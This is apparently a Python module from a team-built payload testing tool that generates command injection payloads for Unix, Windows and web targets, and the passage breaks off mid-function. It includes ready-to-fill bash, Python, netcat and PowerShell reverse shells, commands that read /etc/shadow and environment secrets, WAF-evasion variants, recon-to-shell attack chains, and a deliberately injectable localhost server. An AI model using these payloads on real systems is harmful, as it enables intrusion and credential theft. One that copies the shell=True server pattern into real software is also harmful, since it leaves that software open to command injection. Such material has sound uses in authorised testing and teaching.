"""
╔══════════════════════════════════════════════════════════════╗
║           COMMAND INJECTION MODULE                           ║
║  Author   : Ehtisham                                         ║
║  Project  : Payload Testing Tool                             ║
║  Version  : 2.0                                              ║
║  Feeds into: CLI / Main.py  (Syed Shaiq)                     ║
║  Works with: Encoding Engine (Danish)                        ║
╚══════════════════════════════════════════════════════════════╝

Features:
  ✔ Payload Confidence Score  (0–100)
  ✔ CVE / OWASP Reference Mapping
  ✔ WAF Evasion Tags
  ✔ Payload Chaining  (Recon → Escalate → Shell)
  ✔ Severity / Risk Tagging
  ✔ Context-Aware Payloads
  ✔ Custom Command Injection
  ✔ Reverse Shell Payloads
  ✔ Detection Hints
  ✔ Self-Test against Dummy Vulnerable Server
"""

import subprocess
import tempfile
import time
import os
import urllib.request
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional


# ══════════════════════════════════════════════════════════════
#  DATA MODEL
# ══════════════════════════════════════════════════════════════

@dataclass
class Payload:
    """
    Single command injection payload with full professional metadata.
    """
    payload:          str
    category:         str
    severity:         str                    # Low | Medium | High | Critical
    confidence:       int                    # 0–100  (likelihood of success)
    context:          str                    # where to inject
    detection_hint:   str                    # what to look for in response
    cve_refs:         list[str]              # e.g. ["CVE-2014-6271"]
    owasp_refs:       list[str]              # e.g. ["OWASP-A03:2021"]
    waf_bypasses:     list[str]              # WAFs this payload evades
    chain_step:       int                    # 1=Recon, 2=Escalate, 3=Shell
    chain_group:      str                    # logical chain name
    encoded:          Optional[str] = None   # filled by Danish's Encoding Engine
    tags:             list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "type":           "command_injection",
            "category":       self.category,
            "payload":        self.payload,
            "severity":       self.severity,
            "confidence":     self.confidence,
            "context":        self.context,
            "detection_hint": self.detection_hint,
            "cve_refs":       self.cve_refs,
            "owasp_refs":     self.owasp_refs,
            "waf_bypasses":   self.waf_bypasses,
            "chain_step":     self.chain_step,
            "chain_group":    self.chain_group,
            "encoded":        self.encoded,
            "tags":           self.tags,
        }


# ══════════════════════════════════════════════════════════════
#  CONFIDENCE SCORE GUIDE
# ══════════════════════════════════════════════════════════════
#
#  90–100 : Almost always works on unprotected targets
#  70–89  : Works on most targets, minor filter resistance
#  50–69  : Works on some targets, moderate WAF resistance
#  30–49  : Needs specific conditions or server config
#  10–29  : Highly targeted, limited applicability
#
# ══════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════
#  PAYLOAD LIBRARY
#  chain_step  →  1 = Recon/Detection
#                 2 = Escalation/Data Extraction
#                 3 = Full Compromise / Reverse Shell
# ══════════════════════════════════════════════════════════════

RAW_PAYLOADS = [

    # ─────────────────────────────────────────
    # UNIX — RECON (chain_step=1)
    # ─────────────────────────────────────────
    Payload(
        payload         = "; whoami",
        category        = "unix",
        severity        = "High",
        confidence      = 95,
        context         = "any",
        detection_hint  = "Response contains current OS user (e.g. root, www-data)",
        cve_refs        = ["CVE-2021-22204"],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = [],
        chain_step      = 1,
        chain_group     = "unix_basic",
        tags            = ["recon", "identity"],
    ),
    Payload(
        payload         = "| whoami",
        category        = "unix",
        severity        = "High",
        confidence      = 93,
        context         = "any",
        detection_hint  = "Response contains current OS user",
        cve_refs        = ["CVE-2021-22204"],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["ModSecurity"],
        chain_step      = 1,
        chain_group     = "unix_basic",
        tags            = ["recon", "identity"],
    ),
    Payload(
        payload         = "&& whoami",
        category        = "unix",
        severity        = "High",
        confidence      = 91,
        context         = "any",
        detection_hint  = "Response contains current OS user",
        cve_refs        = ["CVE-2021-22204"],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = [],
        chain_step      = 1,
        chain_group     = "unix_basic",
        tags            = ["recon", "identity"],
    ),
    Payload(
        payload         = "$(whoami)",
        category        = "unix",
        severity        = "High",
        confidence      = 88,
        context         = "any",
        detection_hint  = "Response contains current OS user (subshell execution)",
        cve_refs        = ["CVE-2021-22204"],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["Cloudflare", "ModSecurity"],
        chain_step      = 1,
        chain_group     = "unix_subshell",
        tags            = ["recon", "subshell"],
    ),
    Payload(
        payload         = "`whoami`",
        category        = "unix",
        severity        = "High",
        confidence      = 87,
        context         = "any",
        detection_hint  = "Response contains current OS user (backtick execution)",
        cve_refs        = ["CVE-2021-22204"],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["Cloudflare"],
        chain_step      = 1,
        chain_group     = "unix_subshell",
        tags            = ["recon", "backtick"],
    ),
    Payload(
        payload         = "; sleep 5",
        category        = "unix",
        severity        = "Medium",
        confidence      = 90,
        context         = "any",
        detection_hint  = "Server response delayed by ~5 seconds — time-based blind injection confirmed",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["Cloudflare", "ModSecurity", "AWS WAF", "Akamai"],
        chain_step      = 1,
        chain_group     = "unix_blind",
        tags            = ["blind", "time-based"],
    ),
    Payload(
        payload         = "| sleep 5",
        category        = "unix",
        severity        = "Medium",
        confidence      = 89,
        context         = "any",
        detection_hint  = "Server response delayed by ~5 seconds — time-based blind injection confirmed",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["Cloudflare", "ModSecurity", "AWS WAF"],
        chain_step      = 1,
        chain_group     = "unix_blind",
        tags            = ["blind", "time-based"],
    ),
    Payload(
        payload         = "%0a whoami",
        category        = "unix",
        severity        = "High",
        confidence      = 80,
        context         = "url_parameter",
        detection_hint  = "Response contains OS user after URL newline injection",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["ModSecurity", "Akamai"],
        chain_step      = 1,
        chain_group     = "unix_encoded",
        tags            = ["recon", "url-encoded", "newline"],
    ),

    # ─────────────────────────────────────────
    # UNIX — ESCALATION (chain_step=2)
    # ─────────────────────────────────────────
    Payload(
        payload         = "; cat /etc/passwd",
        category        = "unix",
        severity        = "Critical",
        confidence      = 92,
        context         = "any",
        detection_hint  = "Response contains /etc/passwd entries (root:x:0:0...)",
        cve_refs        = ["CVE-2021-22204", "CVE-2018-15473"],
        owasp_refs      = ["OWASP-A03:2021", "OWASP-A05:2021"],
        waf_bypasses    = [],
        chain_step      = 2,
        chain_group     = "unix_basic",
        tags            = ["escalation", "file-read", "sensitive"],
    ),
    Payload(
        payload         = "; cat /etc/shadow",
        category        = "unix",
        severity        = "Critical",
        confidence      = 70,
        context         = "any",
        detection_hint  = "Response contains hashed passwords from /etc/shadow",
        cve_refs        = ["CVE-2021-22204"],
        owasp_refs      = ["OWASP-A03:2021", "OWASP-A05:2021"],
        waf_bypasses    = [],
        chain_step      = 2,
        chain_group     = "unix_basic",
        tags            = ["escalation", "file-read", "credentials"],
    ),
    Payload(
        payload         = "; id && uname -a && cat /etc/os-release",
        category        = "unix",
        severity        = "High",
        confidence      = 88,
        context         = "any",
        detection_hint  = "Response contains uid/gid, kernel version, and OS details",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = [],
        chain_step      = 2,
        chain_group     = "unix_sysinfo",
        tags            = ["escalation", "sysinfo"],
    ),
    Payload(
        payload         = "; find / -perm -4000 -type f 2>/dev/null",
        category        = "unix",
        severity        = "Critical",
        confidence      = 82,
        context         = "any",
        detection_hint  = "Lists SUID binaries — potential privilege escalation paths",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021", "OWASP-A01:2021"],
        waf_bypasses    = [],
        chain_step      = 2,
        chain_group     = "unix_privesc",
        tags            = ["escalation", "privesc", "suid"],
    ),
    Payload(
        payload         = "; env",
        category        = "unix",
        severity        = "High",
        confidence      = 90,
        context         = "any",
        detection_hint  = "Response contains environment variables — may expose secrets/tokens/API keys",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021", "OWASP-A02:2021"],
        waf_bypasses    = ["Cloudflare", "ModSecurity"],
        chain_step      = 2,
        chain_group     = "unix_sysinfo",
        tags            = ["escalation", "secrets", "env"],
    ),

    # ─────────────────────────────────────────
    # UNIX — REVERSE SHELL (chain_step=3)
    # ─────────────────────────────────────────
    Payload(
        payload         = "; bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1",
        category        = "reverse_shell",
        severity        = "Critical",
        confidence      = 85,
        context         = "unix_any",
        detection_hint  = "Opens interactive bash reverse shell to attacker machine",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = [],
        chain_step      = 3,
        chain_group     = "unix_basic",
        tags            = ["shell", "reverse-shell", "bash"],
    ),
    Payload(
        payload         = "; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        category        = "reverse_shell",
        severity        = "Critical",
        confidence      = 82,
        context         = "unix_any",
        detection_hint  = "Python3 reverse shell — works even if bash TCP redirection is blocked",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["ModSecurity"],
        chain_step      = 3,
        chain_group     = "unix_subshell",
        tags            = ["shell", "reverse-shell", "python"],
    ),
    Payload(
        payload         = "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f",
        category        = "reverse_shell",
        severity        = "Critical",
        confidence      = 80,
        context         = "unix_any",
        detection_hint  = "Netcat mkfifo reverse shell — works without -e flag support",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = [],
        chain_step      = 3,
        chain_group     = "unix_blind",
        tags            = ["shell", "reverse-shell", "netcat"],
    ),

    # ─────────────────────────────────────────
    # WINDOWS — RECON (chain_step=1)
    # ─────────────────────────────────────────
    Payload(
        payload         = "& whoami",
        category        = "windows",
        severity        = "High",
        confidence      = 94,
        context         = "any",
        detection_hint  = "Response contains DOMAIN\\username or COMPUTERNAME\\username",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = [],
        chain_step      = 1,
        chain_group     = "windows_basic",
        tags            = ["recon", "identity", "windows"],
    ),
    Payload(
        payload         = "& ipconfig /all",
        category        = "windows",
        severity        = "Medium",
        confidence      = 90,
        context         = "any",
        detection_hint  = "Response contains full IP configuration including DNS servers",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = [],
        chain_step      = 1,
        chain_group     = "windows_sysinfo",
        tags            = ["recon", "network", "windows"],
    ),
    Payload(
        payload         = "& ping -n 5 127.0.0.1",
        category        = "windows",
        severity        = "Medium",
        confidence      = 91,
        context         = "any",
        detection_hint  = "Response delayed by ~5 seconds — time-based blind injection confirmed",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["Cloudflare", "ModSecurity", "AWS WAF", "Akamai"],
        chain_step      = 1,
        chain_group     = "windows_blind",
        tags            = ["blind", "time-based", "windows"],
    ),

    # ─────────────────────────────────────────
    # WINDOWS — ESCALATION (chain_step=2)
    # ─────────────────────────────────────────
    Payload(
        payload         = "& net user",
        category        = "windows",
        severity        = "Critical",
        confidence      = 88,
        context         = "any",
        detection_hint  = "Response lists all local Windows user accounts",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021", "OWASP-A01:2021"],
        waf_bypasses    = [],
        chain_step      = 2,
        chain_group     = "windows_basic",
        tags            = ["escalation", "users", "windows"],
    ),
    Payload(
        payload         = "& type C:\\Windows\\win.ini",
        category        = "windows",
        severity        = "High",
        confidence      = 85,
        context         = "any",
        detection_hint  = "Response contains [fonts] or [extensions] from win.ini",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = [],
        chain_step      = 2,
        chain_group     = "windows_basic",
        tags            = ["escalation", "file-read", "windows"],
    ),
    Payload(
        payload         = "& powershell -c \"Get-ChildItem Env:\"",
        category        = "windows",
        severity        = "Critical",
        confidence      = 83,
        context         = "any",
        detection_hint  = "Lists all environment variables — may expose secrets/tokens",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021", "OWASP-A02:2021"],
        waf_bypasses    = ["ModSecurity"],
        chain_step      = 2,
        chain_group     = "windows_sysinfo",
        tags            = ["escalation", "secrets", "powershell"],
    ),

    # ─────────────────────────────────────────
    # WINDOWS — REVERSE SHELL (chain_step=3)
    # ─────────────────────────────────────────
    Payload(
        payload         = "& powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        category        = "reverse_shell",
        severity        = "Critical",
        confidence      = 81,
        context         = "windows_any",
        detection_hint  = "Full interactive PowerShell reverse shell on Windows target",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["ModSecurity"],
        chain_step      = 3,
        chain_group     = "windows_basic",
        tags            = ["shell", "reverse-shell", "powershell", "windows"],
    ),

    # ─────────────────────────────────────────
    # SHELLSHOCK (chain_step=1 detection, then 3)
    # ─────────────────────────────────────────
    Payload(
        payload         = "() { :; }; echo; /bin/bash -c 'whoami'",
        category        = "header",
        severity        = "Critical",
        confidence      = 78,
        context         = "http_header_user_agent",
        detection_hint  = "Shellshock — response contains OS user if server uses bash CGI",
        cve_refs        = ["CVE-2014-6271", "CVE-2014-7169"],
        owasp_refs      = ["OWASP-A03:2021", "OWASP-A06:2021"],
        waf_bypasses    = ["Akamai"],
        chain_step      = 1,
        chain_group     = "shellshock",
        tags            = ["recon", "shellshock", "cgi", "header"],
    ),
    Payload(
        payload         = "() { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1",
        category        = "reverse_shell",
        severity        = "Critical",
        confidence      = 75,
        context         = "http_header_user_agent",
        detection_hint  = "Shellshock reverse shell via User-Agent header — bash CGI targets",
        cve_refs        = ["CVE-2014-6271", "CVE-2014-7169"],
        owasp_refs      = ["OWASP-A03:2021", "OWASP-A06:2021"],
        waf_bypasses    = ["Akamai"],
        chain_step      = 3,
        chain_group     = "shellshock",
        tags            = ["shell", "shellshock", "cgi", "header"],
    ),

    # ─────────────────────────────────────────
    # WEB / URL-ENCODED (chain_step=1)
    # ─────────────────────────────────────────
    Payload(
        payload         = "%3B%20whoami",
        category        = "web",
        severity        = "High",
        confidence      = 75,
        context         = "url_parameter",
        detection_hint  = "URL-decoded to '; whoami' — look for OS user in response",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["ModSecurity", "Akamai"],
        chain_step      = 1,
        chain_group     = "web_encoded",
        tags            = ["recon", "url-encoded"],
    ),
    Payload(
        payload         = "%253B%2520whoami",
        category        = "web",
        severity        = "High",
        confidence      = 68,
        context         = "url_parameter",
        detection_hint  = "Double URL-encoded '; whoami' — bypasses single-layer decode WAFs",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["Cloudflare", "ModSecurity", "AWS WAF", "Akamai"],
        chain_step      = 1,
        chain_group     = "web_double_encoded",
        tags            = ["recon", "double-encoded", "bypass"],
    ),
    Payload(
        payload         = "127.0.0.1; whoami",
        category        = "web",
        severity        = "High",
        confidence      = 88,
        context         = "ping_field",
        detection_hint  = "Ping runs then whoami output appears in response body",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = [],
        chain_step      = 1,
        chain_group     = "ping_field",
        tags            = ["recon", "ping-field"],
    ),

    # ─────────────────────────────────────────
    # FILENAME CONTEXT (chain_step=1)
    # ─────────────────────────────────────────
    Payload(
        payload         = "$(whoami).txt",
        category        = "filename",
        severity        = "High",
        confidence      = 65,
        context         = "filename_input",
        detection_hint  = "Saved file is named after OS username — confirms subshell execution",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["Cloudflare", "ModSecurity"],
        chain_step      = 1,
        chain_group     = "filename_injection",
        tags            = ["recon", "filename"],
    ),
    Payload(
        payload         = "file; whoami.txt",
        category        = "filename",
        severity        = "High",
        confidence      = 70,
        context         = "filename_input",
        detection_hint  = "Semicolon in filename triggers second command before extension",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = [],
        chain_step      = 1,
        chain_group     = "filename_injection",
        tags            = ["recon", "filename"],
    ),

    # ─────────────────────────────────────────
    # FILTER BYPASS (chain_step=1)
    # ─────────────────────────────────────────
    Payload(
        payload         = ";${IFS}whoami",
        category        = "bypass",
        severity        = "High",
        confidence      = 72,
        context         = "any",
        detection_hint  = "IFS used as space substitute — bypasses space-filtering WAFs/input validation",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["ModSecurity", "AWS WAF", "Cloudflare"],
        chain_step      = 1,
        chain_group     = "bypass_space",
        tags            = ["bypass", "ifs", "space-filter"],
    ),
    Payload(
        payload         = "$(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
        category        = "bypass",
        severity        = "High",
        confidence      = 65,
        context         = "any",
        detection_hint  = "Hex-encoded 'whoami' executes — bypasses string-based WAF keyword filters",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["Cloudflare", "ModSecurity", "AWS WAF", "Akamai"],
        chain_step      = 1,
        chain_group     = "bypass_hex",
        tags            = ["bypass", "hex-encoded", "obfuscation"],
    ),
    Payload(
        payload         = "w'h'o'a'm'i",
        category        = "bypass",
        severity        = "Medium",
        confidence      = 60,
        context         = "any",
        detection_hint  = "Quote-broken 'whoami' — bypasses keyword string matching",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["ModSecurity", "Akamai"],
        chain_step      = 1,
        chain_group     = "bypass_quotes",
        tags            = ["bypass", "quote-break"],
    ),
    Payload(
        payload         = "/bin/c?t /etc/passwd",
        category        = "bypass",
        severity        = "Critical",
        confidence      = 70,
        context         = "any",
        detection_hint  = "Glob ? replaces 'a' in cat — bypasses literal 'cat' keyword filter",
        cve_refs        = [],
        owasp_refs      = ["OWASP-A03:2021"],
        waf_bypasses    = ["ModSecurity", "AWS WAF"],
        chain_step      = 2,
        chain_group     = "bypass_glob",
        tags            = ["bypass", "glob", "file-read"],
    ),
]


# ══════════════════════════════════════════════════════════════
#  PAYLOAD CHAIN DEFINITIONS
#  A chain = ordered steps: Recon → Escalate → Shell
# ══════════════════════════════════════════════════════════════

CHAIN_DEFINITIONS = {
    "unix_basic": {
        "name":        "Unix Basic Attack Chain",
        "description": "Standard Unix injection: detect → extract data → reverse shell",
        "os":          "unix",
        "steps": {
            1: "Confirm injection with whoami",
            2: "Extract /etc/passwd and environment variables",
            3: "Deploy bash reverse shell",
        },
    },
    "unix_blind": {
        "name":        "Unix Blind (Time-Based) Chain",
        "description": "For blind injection where output is not reflected in response",
        "os":          "unix",
        "steps": {
            1: "Confirm blind injection via sleep delay",
            2: "Extract data via OOB DNS/HTTP callback",
            3: "Deploy reverse shell",
        },
    },
    "unix_subshell": {
        "name":        "Unix Subshell Chain",
        "description": "Uses $() and backtick subshells — good against basic filters",
        "os":          "unix",
        "steps": {
            1: "Confirm subshell execution with $(whoami)",
            2: "Extract sensitive files via subshell",
            3: "Deploy Python reverse shell",
        },
    },
    "windows_basic": {
        "name":        "Windows Basic Attack Chain",
        "description": "Standard Windows injection: detect → enumerate → PowerShell shell",
        "os":          "windows",
        "steps": {
            1: "Confirm injection with & whoami",
            2: "Enumerate users, env vars, and config",
            3: "Deploy PowerShell reverse shell",
        },
    },
    "shellshock": {
        "name":        "Shellshock Chain (CVE-2014-6271)",
        "description": "Exploit Shellshock via HTTP headers in bash CGI environments",
        "os":          "unix",
        "steps": {
            1: "Detect Shellshock via User-Agent header",
            2: "N/A — direct to shell",
            3: "Deploy Shellshock reverse shell via header",
        },
    },
    "ping_field": {
        "name":        "Ping Field Chain",
        "description": "Target web forms that use user input in system ping commands",
        "os":          "any",
        "steps": {
            1: "Inject into ping field — confirm with whoami",
            2: "Read sensitive files through same vector",
            3: "Deploy reverse shell through ping field",
        },
    },
}


# ══════════════════════════════════════════════════════════════
#  DUMMY VULNERABLE SERVER (for self-test)
# ══════════════════════════════════════════════════════════════

DUMMY_SERVER_CODE = """
import http.server, subprocess, urllib.parse

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        cmd    = params.get("input", [""])[0]
        try:
            out = subprocess.check_output(
                f"echo {cmd}", shell=True, stderr=subprocess.STDOUT, timeout=6
            ).decode()
        except Exception as e:
            out = str(e)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(out.encode())
    def log_message(self, *a):
        pass

import sys
port = int(sys.argv[1]) if len(sys.argv) > 1 else 65432
http.server.HTTPServer(("127.0.0.1", port), Handler).serve_forever()
"""


# ══════════════════════════════════════════════════════════════
#  MAIN MODULE CLASS
# ══════════════════════════════════════════════════════════════

class CommandInjectionModule:
    """
    Professional Command Injection payload module.
    Integrates with CLI/Main.py via get_payloads().
    """

    SEVERITY_ORDER = {"Low": 1, "Medium": 2, "High": 3, "Critical": 4}

    def __init__(
        self,
        target_os:      str  = "all",
        custom_command: str  = None,
        attacker_ip:    str  = "ATTACKER_IP",
        attacker_port:  int  = 4444,
        min_severity:   str  = "Low",
        min_confidence: int  = 0,
        waf_target:     str  = None,
    ):
        """
        Parameters
        ----------
        target_os      : 'unix' | 'windows' | 'web' | 'all'
        custom_command : replace default recon command (e.g. 'id', 'hostname')
        attacker_ip    : your IP for reverse shell payloads
        attacker_port  : your port for reverse shell payloads
        min_severity   : minimum severity — 'Low'|'Medium'|'High'|'Critical'
        min_confidence : minimum confidence score (0–100)
        waf_target     : only return payloads that bypass this WAF
                         e.g. 'Cloudflare'|'ModSecurity'|'AWS WAF'|'Akamai'
        """
        self.target_os      = target_os.lower()
        self.custom_command = custom_command
        self.attacker_ip    = attacker_ip
        self.attacker_port  = attacker_port
        self.min_severity   = min_severity
        self.min_confidence = min_confidence
        self.waf_target     = waf_target

    # ── internal helpers ───────────────────────────────────

    def _apply_custom_command(self, p: str) -> str:
        if not self.custom_command:
            return p
        for default in ["whoami", "ls", "id", "dir", "ipconfig",
                        "net user", "systeminfo", "Get-Process",
                        "cat /etc/passwd"]:
            p = p.replace(default, self.custom_command)
        return p

    def _apply_attacker_info(self, p: str) -> str:
        return p.replace("ATTACKER_IP", self.attacker_ip) \
                .replace("ATTACKER_PORT", str(self.attacker_port))

    def _severity_ok(self, severity: str) -> bool:
        return (self.SEVERITY_ORDER.get(severity, 0)
                >= self.SEVERITY_ORDER.get(self.min_severity, 1))

    def _os_ok(self, category: str) -> bool:
        if self.target_os == "all":
            return True
        os_map = {
            "unix":    ["unix", "web", "header", "filename", "bypass", "reverse_shell"],
            "windows": ["windows", "web", "header", "filename", "bypass", "reverse_shell"],
            "web":     ["web", "header", "filename", "bypass"],
        }
        return category in os_map.get(self.target_os, [])

    def _waf_ok(self, waf_bypasses: list) -> bool:
        if not self.waf_target:
            return True
        return self.waf_target in waf_bypasses

    # ── public API ─────────────────────────────────────────

    def get_payloads(self) -> list[dict]:
        """
        Returns filtered, processed payload list as dicts.
        Called by Main.py (Syed Shaiq).
        Sorted by confidence score descending.
        """
        result = []
        for entry in RAW_PAYLOADS:
            if not self._severity_ok(entry.severity):
                continue
            if entry.confidence < self.min_confidence:
                continue
            if not self._os_ok(entry.category):
                continue
            if not self._waf_ok(entry.waf_bypasses):
                continue

            p = self._apply_custom_command(entry.payload)
            p = self._apply_attacker_info(p)

            d = entry.to_dict()
            d["payload"] = p
            result.append(d)

        return sorted(result, key=lambda x: x["confidence"], reverse=True)

    def get_raw_list(self) -> list[str]:
        """Plain strings only — for Danish's Encoding Engine."""
        return [p["payload"] for p in self.get_payloads()]

    def filter_by_severity(self, severity: str) -> list[dict]:
        return [p for p in self.get_payloads() if p["severity"] == severity]

    def filter_by_context(self, context: str) -> list[dict]:
        return [
            p for p in self.get_payloads()
            if context in p["context"] or p["context"] == "any"
        ]

    def filter_by_cve(self, cve: str) -> list[dict]:
        return [p for p in self.get_payloads() if cve in p["cve_refs"]]

    def filter_by_waf(self, waf: str) -> list[dict]:
        return [p for p in self.get_payloads() if waf in p["waf_bypasses"]]

    def filter_by_tag(self, tag: str) -> list[dict]:
        return [p for p in self.get_payloads() if tag in p["tags"]]

    # ── PAYLOAD CHAINING ───────────────────────────────────

    def get_chain(self, chain_group: str) -> dict:
        """
        Returns a full ordered attack chain for a given chain group.
        Steps: 1=Recon, 2=Escalate, 3=Shell

        Example:
            chain = ci.get_chain("unix_basic")
        """
        all_payloads = self.get_payloads()
        chain_payloads = [
            p for p in all_payloads if p["chain_group"] == chain_group
        ]

        steps = {1: [], 2: [], 3: []}
        for p in chain_payloads:
            steps[p["chain_step"]].append(p)

        definition = CHAIN_DEFINITIONS.get(chain_group, {})

        return {
            "chain_group": chain_group,
            "name":        definition.get("name", chain_group),
            "description": definition.get("description", ""),
            "os":          definition.get("os", "any"),
            "step_labels": definition.get("steps", {}),
            "steps":       steps,
            "total":       len(chain_payloads),
        }

    def get_all_chains(self) -> list[dict]:
        """Returns all available attack chains."""
        return [self.get_chain(g) for g in CHAIN_DEFINITIONS]

    def print_chain(self, chain_group: str):
        """Pretty-print a full attack chain to console."""
        chain = self.get_chain(chain_group)
        print(f"\n{'═'*60}")
        print(f"  Chain : {chain['name']}")
        print(f"  OS    : {chain['os']}")
        print(f"  Info  : {chain['description']}")
        print(f"{'═'*60}")
        for step_num in [1, 2, 3]:
            label = chain["step_labels"].get(step_num, f"Step {step_num}")
            step_name = {1: "RECON", 2: "ESCALATE", 3: "SHELL"}[step_num]
            print(f"\n  [{step_num}] {step_name} — {label}")
            payloads = chain["steps"].get(step_num, [])
            if payloads:
                for p in payloads:
                    print(f"      Payload    : {p['payload'][:70]}")
                    print(f"      Confidence : {p['confidence']}%  |  "
                          f"Severity: {p['severity']}  |  "
                          f"WAF Bypass: {', '.join(p['waf_bypasses']) or 'None'}")
                    print(f"      Hint       : {p['detection_hint']}")
                    if p["cve_refs"]:
                        print(f"      CVEs       : {', '.join(p['cve_refs'])}")
                    print()
            else:
                print("      (no payloads in this step for current filters)\n")
        print(f"{'═'*60}\n")

    # ── SUMMARY ────────────────────────────────────────────

    def summary(self) -> dict:
        payloads = self.get_payloads()
        cats, sevs, wafs, cves = {}, {}, {}, {}
        total_conf = 0
        for p in payloads:
            cats[p["category"]] = cats.get(p["category"], 0) + 1
            sevs[p["severity"]] = sevs.get(p["severity"], 0) + 1
            total_conf += p["confidence"]
            for w in p["waf_bypasses"]:
                wafs[w] = wafs.get(w, 0) + 1
            for c in p["cve_refs"]:
                cvs = cves.get(c, 0) + 1
                cves[c] = cvs
        return {
            "total":            len(payloads),
            "avg_confidence":   round(total_conf / len(payloads), 1) if payloads else 0,
            "by_category":      cats,
            "by_severity":      sevs,
            "waf_coverage":     wafs,
            "cve_references":   cves,
        }

    def print_summary(self):
        s = self.summary()
        print("\n" + "═" * 60)
        print("   Command Injection Module v2.0 — Ehtisham")
        print("═" * 60)
        print(f"   Total Payloads     : {s['total']}")
        print(f"   Avg Confidence     : {s['avg_confidence']}%")
        print(f"\n   By Category:")
        for cat, n in s["by_category"].items():
            print(f"     {cat:<20} : {n}")
        print(f"\n   By Severity:")
        for sev in ["Low", "Medium", "High", "Critical"]:
            print(f"     {sev:<20} : {s['by_severity'].get(sev, 0)}")
        print(f"\n   WAF Coverage:")
        for waf, n in s["waf_coverage"].items():
            print(f"     {waf:<20} : {n} payloads")
        print(f"\n   CVE References:")
        for cve, n in s["cve_references"].items():
            print(f"     {cve:<25} : {n} payloads")
        print("═" * 60 + "\n")

    # ── SELF-TEST ──────────────────────────────────────────

    def self_test(self, port: int = 65432) -> dict:
        """
        Spins up a local dummy vulnerable HTTP server,
        fires basic payloads at it, and reports results.
        Safe — runs on localhost only.
        """
        tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False)
        tmp.write(DUMMY_SERVER_CODE)
        tmp.close()

        server_proc = subprocess.Popen(
            ["python3", tmp.name, str(port)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(1)

        test_payloads = [
            "; echo INJECTED",
            "| echo INJECTED",
            "&& echo INJECTED",
            "$(echo INJECTED)",
            "`echo INJECTED`",
        ]

        results = {"passed": [], "failed": [], "total": len(test_payloads)}
        for payload in test_payloads:
            try:
                encoded = urllib.parse.quote(payload)
                url     = f"http://127.0.0.1:{port}/?input={encoded}"
                resp    = urllib.request.urlopen(url, timeout=5).read().decode()
                if "INJECTED" in resp:
                    results["passed"].append(payload)
                else:
                    results["failed"].append(payload)
            except Exception as e:
                results["failed"].append(f"{payload} (error: {e})")

        server_proc.terminate()
        os.unlink(tmp.name)
        return results

    def run_self_test(self):
        print("\n[*] Self-Test — dummy vulnerable server on localhost")
        r = self.self_test()
        print(f"    Tested  : {r['total']}")
